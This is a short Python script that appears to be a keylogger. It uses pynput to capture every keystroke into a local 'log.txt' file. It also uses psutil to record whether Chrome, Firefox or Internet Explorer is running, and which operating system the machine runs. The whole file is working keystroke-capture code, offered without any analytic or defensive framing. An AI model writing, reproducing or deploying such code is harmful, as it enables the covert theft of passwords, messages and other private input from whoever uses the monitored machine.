from pynput.keyboard import Listener
import logging
import time
import psutil
import sys

CTIME = time.ctime()
OUTPUT = 'log.txt'

logging.basicConfig(filename=(OUTPUT), level=logging.DEBUG, format=CTIME + ': %(message)s')

def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

Chrome = f"{CTIME} | Chrome is running..."
FireFox = f"{CTIME} | Firefox is running..."
IExplorer = f"{CTIME} | Internet Explorer is running..."


while True:
    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        if checkIfProcessRunning('chrome'):
            logging.info(Chrome)
        elif checkIfProcessRunning('firefox'):
            logging.info(FireFox)
        elif checkIfProcessRunning('iexplorer'):
            logging.info(IExplorer)
        else:
            logging.info("Unknown Browser is running")


    if sys.platform.startswith('linux'):
        logging.info(f"{CTIME}| System: Linux Machine")
    elif "windows" in sys.platform:
        logging.info(f"{CTIME} | System: Windows Machine")
        listener.join()
